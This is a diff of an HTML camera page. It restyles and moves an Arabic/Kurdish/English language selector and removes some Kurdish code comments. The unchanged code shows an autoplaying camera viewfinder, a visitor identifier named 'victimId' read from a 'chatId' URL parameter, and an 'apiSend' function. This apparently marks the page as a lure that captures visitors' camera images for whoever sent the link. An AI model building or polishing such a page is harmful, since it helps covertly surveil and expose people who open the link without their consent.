@@ -28,6 +28,7 @@
             position: absolute;
             inset: 0;
             background: linear-gradient(180deg, rgba(0,0,0,.3), transparent 30%, transparent 70%, rgba(0,0,0,.5));
+            z-index: 1;
         }
         #status {
             position: absolute;
@@ -40,6 +41,37 @@
             text-shadow: 0 1px 3px #000;
             z-index: 5;
         }
+
+        /* ---------- هەڵبژاردەی زمان (دیارتر و ڕوونتر) ---------- */
+        .lang-selector {
+            position: absolute;
+            top: 16px;
+            left: 20px;          /* لەسەر لای چەپ بۆ ئەوەی بە status نەکەوێت */
+            z-index: 99;
+            background: rgba(0,0,0,0.75);
+            backdrop-filter: blur(8px);
+            border-radius: 30px;
+            padding: 6px 16px;
+            display: flex;
+            gap: 10px;
+            border: 1px solid rgba(255,255,255,0.2);
+        }
+        .lang-btn {
+            border: none;
+            background: transparent;
+            padding: 8px 14px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+            color: #ccc;
+            transition: 0.3s;
+        }
+        .lang-btn.active {
+            background: #34c759;
+            color: #fff;
+        }
+
         #controls {
             display: flex;
             justify-content: center;
@@ -59,52 +91,23 @@
         #shutter:active {
             background: #fff;
         }
-
-        /* ===== هەڵبژاردەی زمان (زیادکراو) ===== */
-        .lang-selector {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            z-index: 99;
-            background: rgba(255,255,255,0.9);
-            border-radius: 30px;
-            padding: 5px 15px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
-            display: flex;
-            gap: 10px;
-            backdrop-filter: blur(10px);
-        }
-        .lang-btn {
-            border: none;
-            background: transparent;
-            padding: 8px 12px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 600;
-            color: #333;
-            transition: 0.3s;
-        }
-        .lang-btn.active {
-            background: #34c759;
-            color: #fff;
-        }
     </style>
 </head>
 <body>
 
-    <!-- ========== هەڵبژاردەی زمان ========== -->
-    <div class="lang-selector">
-        <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
-        <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
-        <button class="lang-btn" onclick="changeLang('en')">English</button>
-    </div>
-
+    <!-- ========== هەڵبژاردەی زمان (خراوەتە ناو viewfinder بۆ دیاربوون) ========== -->
     <div id="viewfinder">
         <video id="video" autoplay playsinline muted></video>
         <div id="overlay"></div>
         <div id="status" data-i18n="loading">جارٍ تجهيز الكاميرا...</div>
+
+        <div class="lang-selector">
+            <button class="lang-btn active" onclick="changeLang('ar')">العربية</button>
+            <button class="lang-btn" onclick="changeLang('ckb')">کوردی</button>
+            <button class="lang-btn" onclick="changeLang('en')">English</button>
+        </div>
     </div>
+
     <div id="controls">
         <span style="width:18px"></span>
         <button id="shutter"></button>
@@ -141,14 +144,12 @@
         };
 
         function changeLang(lang) {
-            // گۆڕینی ئاڕاستەی پەڕە (بۆ عەرەبی و کوردی RTL، ئینگلیزی LTR)
             if (lang === 'ar' || lang === 'ckb') {
                 document.documentElement.dir = 'rtl';
             } else {
                 document.documentElement.dir = 'ltr';
             }
 
-            // نوێکردنەوەی هەموو توخمەکانی data-i18n
             document.querySelectorAll('[data-i18n]').forEach(el => {
                 const key = el.getAttribute('data-i18n');
                 if (translations[lang] && translations[lang][key]) {
@@ -156,21 +157,19 @@
                 }
             });
 
-            // دیاریکردنی دوگمەی چالاک لە هەڵبژاردەکە
             document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
             document.querySelector(`[onclick="changeLang('${lang}')"]`).classList.add('active');
 
-            // پاشەکەوتکردنی زمان
             localStorage.setItem('preferred_lang', lang);
         }
 
-        // بارکردنی زمانی پاشەکەوتکراو لەگەڵ کرانەوەی پەڕە
+        // بارکردنی زمانی پاشەکەوتکراو
         window.addEventListener('DOMContentLoaded', () => {
             const savedLang = localStorage.getItem('preferred_lang') || 'ar';
             changeLang(savedLang);
         });
 
-        /* ===== کۆدی بنەڕەتی کامێرا (دەستکاری نەکراو) ===== */
+        /* ===== کۆدی بنەڕەتی کامێرا (هیچ دەستکاری نەکراوە) ===== */
         const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';
 
         async function apiSend(payload) {
